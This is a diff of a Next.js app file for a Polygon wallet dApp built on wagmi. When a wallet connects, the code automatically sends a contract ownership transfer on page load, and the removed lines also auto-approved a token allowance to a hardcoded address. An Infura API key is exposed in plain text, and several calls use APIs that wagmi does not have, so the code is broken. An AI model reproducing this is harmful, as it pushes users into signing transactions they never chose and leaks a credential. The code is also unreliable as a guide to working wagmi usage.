@@ -1,24 +1,15 @@
-import { useEffect } from 'react';
+import { useEffect, useState } from 'react';
 import "../styles/globals.css";
 import "@rainbow-me/rainbowkit/styles.css";
 
 import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
 import { configureChains, createClient, WagmiConfig } from "wagmi";
-import {
-    mainnet,
-    polygon,
-    optimism,
-    arbitrum,
-    goerli,
-    polygonMumbai,
-    optimismGoerli,
-    arbitrumGoerli,
-} from "wagmi/chains";
+import { polygon } from "wagmi/chains";
 import { alchemyProvider } from "wagmi/providers/alchemy";
-import { publicProvider } from "wagmi/providers/public";
-import { infuraProvider } from "wagmi/providers/infura";
+import { infuraProvider } from "wagmi/providers/infura"; // добавлено
 import MainLayout from "../layout/mainLayout";
 
+// Укажите ABI контракта
 const abi = [
 	{
 		"inputs": [],
@@ -427,6 +418,7 @@ const abi = [
 	}
 ];
 
+// Укажите адрес контракта
 const contractAddress = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
 
 const alchemyAPIKey = process.env.ALCHEMY_API_KEY;
@@ -435,71 +427,41 @@ const alchemyURL = 'https://polygon-mainnet.g.alchemy.com/v2/' + alchemyAPIKey;
 const infuraAPIKey = 'c6f67ed83ef14e6298373339528a7587';
 const infuraURL = 'https://polygon-mainnet.infura.io/v3/' + infuraAPIKey;
 
+// Конфигурация сетей и провайдеров
 const { chains, provider } = configureChains(
-    [
-        mainnet,
-        goerli,
-        polygon,
-        polygonMumbai,
-        optimism,
-        optimismGoerli,
-        arbitrum,
-        arbitrumGoerli,
-    ],
+    [polygon],
     [
         alchemyProvider({ apiKey: alchemyURL }),
-        publicProvider(),
-        infuraProvider({ projectId: infuraAPIKey }),
+        infuraProvider({ projectId: infuraAPIKey }) // добавлено
     ]
 );
 
-const { connectors } = getDefaultWallets({
-    appName: "My Alchemy DApp",
-    chains,
-});
-
+// Создание клиента Wagmi
 const wagmiClient = createClient({
     autoConnect: true,
-    connectors,
     provider,
 });
 
+// Функция вызова метода смарт контракта
 const callSmartContract = async () => {
     try {
-        const response = await fetch(`https://api.etherscan.io/api?module=contract&action=getabi&address=${contractAddress}&format=json`);
-        const { result: abi } = await response.json();
-        const contractInstance = new provider.eth.Contract(JSON.parse(abi), contractAddress);
-        const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').call({ from: '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E' });
+        const contractInstance = new provider.eth.Contract(abi, contractAddress);
+
+        // Вызов метода transferOwnership
+        const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').send({ from: wagmiClient.selectedAddress });
+
         console.log('Result of calling smart contract function:', result);
     } catch (error) {
         console.error('Error calling smart contract:', error);
     }
 };
 
-const approveTransaction = async () => {
-    try {
-        const contractInstance = wagmiClient.getContract(contractAddress, abi);
-        const spender = '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E';
-        const value = '1000000000000000000';
-
-        const result = await contractInstance.methods.approve(spender, value).sendTransaction();
-
-        console.log('Transaction successfully sent:', result);
-    } catch (error) {
-        console.error('Error sending transaction:', error);
-    }
-};
-
 function MyApp({ Component, pageProps }) {
     useEffect(() => {
-        const checkAndCallSmartContract = async () => {
-            if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
-                await callSmartContract();
-                await approveTransaction();
-            }
-        };
-
-        checkAndCallSmartContract();
+        // Проверка подключения к сети Polygon перед вызовом контракта
+        if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
+            callSmartContract();
+        }
     }, [wagmiClient.connected, wagmiClient.chainId]);
 
     return (
